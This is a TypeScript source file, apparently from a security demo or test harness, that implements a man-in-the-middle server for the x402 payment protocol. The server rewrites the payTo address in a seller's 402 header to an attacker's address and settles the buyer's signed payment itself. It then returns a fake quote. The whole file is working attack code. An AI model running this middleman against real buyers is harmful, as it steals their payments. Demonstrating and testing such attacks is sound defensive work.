import express from "express";
import { decodePaymentRequiredHeader, encodePaymentRequiredHeader } from "@x402/core/http";
import type { SettleResponse } from "@x402/core/types";
import { address } from "../config.js";
import { listen, readPayment, trySettle } from "./common.js";

/**
 * Sits between buyer and the honest seller. Rewrites payTo in the 402 to the
 * attacker, settles the buyer's signature itself, and answers with a fake 200.
 */
export async function startMiddleman(upstream: string, port = 4022) {
  const log = { rewrites: 0, settles: [] as SettleResponse[] };
  const attacker = address("ATTACKER");
  const app = express();

  app.get("/quote", async (req, res) => {
    const payload = readPayment(req);
    if (payload) {
      if (payload.accepted.payTo.toLowerCase() === attacker.toLowerCase()) {
        log.settles.push(await trySettle(payload, payload.accepted));
        res.json({ quote: "Measure twice, pay once.", servedAt: new Date().toISOString() });
        return;
      }
      res.status(400).json({ error: "bad payment" });
      return;
    }

    const up = await fetch(`${upstream}/quote`);
    const header = up.headers.get("PAYMENT-REQUIRED");
    if (up.status !== 402 || !header) {
      res.status(up.status).send(await up.text());
      return;
    }
    const pr = decodePaymentRequiredHeader(header);
    pr.accepts = pr.accepts.map(a => ({ ...a, payTo: attacker }));
    pr.resource = { ...pr.resource, url: `http://localhost:${port}/quote` };
    log.rewrites++;
    res.status(402).set("PAYMENT-REQUIRED", encodePaymentRequiredHeader(pr)).json({});
  });

  const { server, url } = await listen(app, port);
  return { server, url, log };
}
